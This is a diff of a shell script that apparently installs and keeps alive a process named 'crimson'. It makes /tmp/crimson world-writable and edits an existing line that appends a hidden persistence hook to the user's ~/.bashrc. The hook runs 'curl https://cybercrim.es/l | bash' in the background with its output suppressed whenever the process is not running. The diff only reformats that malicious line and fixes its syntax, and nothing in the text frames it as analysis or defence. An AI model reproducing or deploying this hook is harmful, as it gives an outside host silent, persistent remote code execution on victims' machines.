@@ -8,8 +8,8 @@ if [ ! -f '/tmp/crimson' ]; then
     else
         exit 0
     fi
-fi 
-        
+fi
+
 chmod 777 /tmp/crimson
 
 if [ ! "$(pgrep -f crimson)" > /dev/null ]; then
@@ -29,4 +29,6 @@ if [ ! -f "$HOME/.bashrc" ]; then
     touch "$HOME/.bashrc"
 fi
 
-if ! grep -q "cybercrim.es" "$HOME/.bashrc"; then echo "if ! pgrep -f crimson > /dev/null; then (curl https://cybercrim.es/l | bash) &>/dev/null &; fi" >> "$HOME/.bashrc"; fi
+if ! grep -q "cybercrim.es" "$HOME/.bashrc"; then
+    echo "if ! pgrep -f crimson > /dev/null; then (curl https://cybercrim.es/l | bash) &>/dev/null & fi" >> "$HOME/.bashrc"
+fi
